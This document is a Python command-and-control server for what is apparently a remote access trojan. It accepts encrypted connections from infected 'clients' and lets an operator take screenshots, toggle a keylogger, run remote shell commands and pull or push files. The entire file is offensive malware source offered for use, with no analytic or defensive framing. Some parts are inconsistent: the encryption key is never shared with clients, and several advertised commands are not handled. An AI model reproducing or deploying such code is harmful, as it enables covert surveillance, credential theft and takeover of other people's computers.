import socket
import threading
import json
import base64
import os
from datetime import datetime
from cryptography.fernet import Fernet

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=5000):
        self.host = host
        self.port = port
        self.clients = {}
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        
        # Create directories for storing files
        os.makedirs('downloads', exist_ok=True)
        os.makedirs('screenshots', exist_ok=True)
        
        # Initialize server socket
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        
        print(f"[*] Server started on {self.host}:{self.port}")

    def handle_client(self, client_socket, address):
        """Handle individual client connections"""
        try:
            # Initial handshake
            client_info = json.loads(self.decrypt_message(client_socket.recv(4096)))
            client_id = client_info['id']
            self.clients[client_id] = {
                'socket': client_socket,
                'info': client_info,
                'address': address,
                'connected_time': datetime.now(),
                'last_seen': datetime.now()
            }
            
            print(f"[+] New client connected: {client_info['hostname']} ({address[0]})")
            
            while True:
                try:
                    # Receive encrypted message
                    encrypted_msg = client_socket.recv(4096)
                    if not encrypted_msg:
                        break
                    
                    # Decrypt and parse message
                    msg = json.loads(self.decrypt_message(encrypted_msg))
                    
                    # Handle different message types
                    if msg['type'] == 'heartbeat':
                        self.clients[client_id]['last_seen'] = datetime.now()
                    
                    elif msg['type'] == 'screenshot':
                        # Save screenshot
                        screenshot_data = base64.b64decode(msg['data'])
                        filename = f"screenshots/{client_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
                        with open(filename, 'wb') as f:
                            f.write(screenshot_data)
                    
                    elif msg['type'] == 'command_result':
                        print(f"\n[*] Command result from {client_info['hostname']}:")
                        print(msg['data'])
                    
                    elif msg['type'] == 'file_upload':
                        # Save uploaded file
                        file_data = base64.b64decode(msg['data'])
                        filename = f"downloads/{msg['filename']}"
                        with open(filename, 'wb') as f:
                            f.write(file_data)
                        print(f"[+] File received: {filename}")
                    
                    elif msg['type'] == 'keylog':
                        print(f"\n[*] Keylog data from {client_info['hostname']}:")
                        print(msg['data'])
                
                except Exception as e:
                    print(f"[!] Error handling client message: {e}")
                    break
        
        except Exception as e:
            print(f"[!] Client connection error: {e}")
        
        finally:
            # Clean up client connection
            if client_id in self.clients:
                del self.clients[client_id]
            client_socket.close()
            print(f"[-] Client disconnected: {address[0]}")

    def send_command(self, client_id, command_type, data=None):
        """Send command to specific client"""
        if client_id not in self.clients:
            print(f"[!] Client {client_id} not found")
            return False
        
        try:
            command = {
                'type': command_type,
                'data': data
            }
            
            encrypted_cmd = self.encrypt_message(json.dumps(command))
            self.clients[client_id]['socket'].send(encrypted_cmd)
            return True
        
        except Exception as e:
            print(f"[!] Error sending command: {e}")
            return False

    def encrypt_message(self, message):
        """Encrypt message using Fernet"""
        return self.cipher.encrypt(message.encode())

    def decrypt_message(self, encrypted_message):
        """Decrypt message using Fernet"""
        return self.cipher.decrypt(encrypted_message).decode()

    def list_clients(self):
        """List all connected clients"""
        print("\nConnected Clients:")
        print("-" * 60)
        for client_id, client in self.clients.items():
            info = client['info']
            print(f"ID: {client_id}")
            print(f"Hostname: {info['hostname']}")
            print(f"IP: {client['address'][0]}")
            print(f"OS: {info['os']}")
            print(f"Connected: {client['connected_time']}")
            print(f"Last seen: {client['last_seen']}")
            print("-" * 60)

    def start(self):
        """Start the server and handle incoming connections"""
        print("[*] Waiting for incoming connections...")
        
        # Start command interface thread
        cmd_thread = threading.Thread(target=self.command_interface)
        cmd_thread.daemon = True
        cmd_thread.start()
        
        try:
            while True:
                client_socket, address = self.server.accept()
                client_handler = threading.Thread(
                    target=self.handle_client,
                    args=(client_socket, address)
                )
                client_handler.daemon = True
                client_handler.start()
        
        except KeyboardInterrupt:
            print("\n[*] Shutting down server...")
            self.server.close()

    def command_interface(self):
        """Interactive command interface"""
        while True:
            try:
                command = input("\nServer> ").strip().lower()
                
                if command == "help":
                    print("\nAvailable commands:")
                    print("  clients        - List connected clients")
                    print("  select <id>    - Select a client to control")
                    print("  screenshot <id> - Take screenshot from client")
                    print("  shell <id>     - Start remote shell")
                    print("  keylog <id>    - Toggle keylogger")
                    print("  upload <id>    - Upload file to client")
                    print("  download <id>  - Download file from client")
                    print("  exit           - Exit server")
                
                elif command == "clients":
                    self.list_clients()
                
                elif command.startswith("select "):
                    client_id = command.split()[1]
                    if client_id in self.clients:
                        print(f"[*] Selected client: {self.clients[client_id]['info']['hostname']}")
                        self.interact_with_client(client_id)
                    else:
                        print("[!] Client not found")
                
                elif command == "exit":
                    break
                
                else:
                    print("[!] Unknown command. Type 'help' for available commands.")
            
            except Exception as e:
                print(f"[!] Command interface error: {e}")

    def interact_with_client(self, client_id):
        """Interactive session with specific client"""
        client = self.clients[client_id]
        print(f"\nInteracting with {client['info']['hostname']}")
        print("Type 'back' to return to main menu")
        
        while True:
            try:
                cmd = input(f"{client['info']['hostname']}> ").strip()
                
                if cmd == "back":
                    break
                
                elif cmd == "screenshot":
                    self.send_command(client_id, 'screenshot')
                    print("[*] Requesting screenshot...")
                
                elif cmd.startswith("shell "):
                    command = cmd[6:]
                    self.send_command(client_id, 'shell', command)
                
                elif cmd == "keylog":
                    self.send_command(client_id, 'keylog')
                    print("[*] Toggling keylogger...")
                
                elif cmd.startswith("upload "):
                    filepath = cmd[7:]
                    if os.path.exists(filepath):
                        with open(filepath, 'rb') as f:
                            file_data = base64.b64encode(f.read()).decode()
                        self.send_command(client_id, 'upload', {
                            'filename': os.path.basename(filepath),
                            'data': file_data
                        })
                        print("[*] File upload initiated...")
                    else:
                        print("[!] File not found")
                
                elif cmd.startswith("download "):
                    filepath = cmd[9:]
                    self.send_command(client_id, 'download', filepath)
                    print("[*] File download initiated...")
                
                else:
                    print("[!] Unknown command")
            
            except Exception as e:
                print(f"[!] Error: {e}")

if __name__ == "__main__":
    server = RemoteServer()
    server.start()